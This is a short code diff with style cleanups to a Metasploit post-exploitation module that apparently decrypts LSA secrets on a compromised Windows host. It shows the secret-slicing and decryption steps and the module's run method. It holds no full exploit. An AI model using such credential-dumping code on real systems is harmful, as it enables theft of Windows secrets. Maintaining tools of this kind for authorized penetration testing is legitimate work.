@@ -62,15 +62,15 @@ class MetasploitModule < Msf::Post
         else
           # and here
           if sysinfo['Architecture'] == ARCH_X64
-            encrypted_secret = encrypted_secret[0x10..-1]
+            encrypted_secret = encrypted_secret[0x10..]
           else # 32 bits
-            encrypted_secret = encrypted_secret[0xC..-1]
+            encrypted_secret = encrypted_secret[0xC..]
           end
 
           decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
         end
 
-        next unless decrypted.length > 0
+        next if decrypted.empty?
 
         # axe all the non-printables
         decrypted = decrypted.scan(/[[:print:]]/).join
@@ -124,7 +124,6 @@ class MetasploitModule < Msf::Post
 
   # The sauce starts here
   def run
-
     hostname = sysinfo['Computer']
     print_status("Executing module against #{hostname}")
 
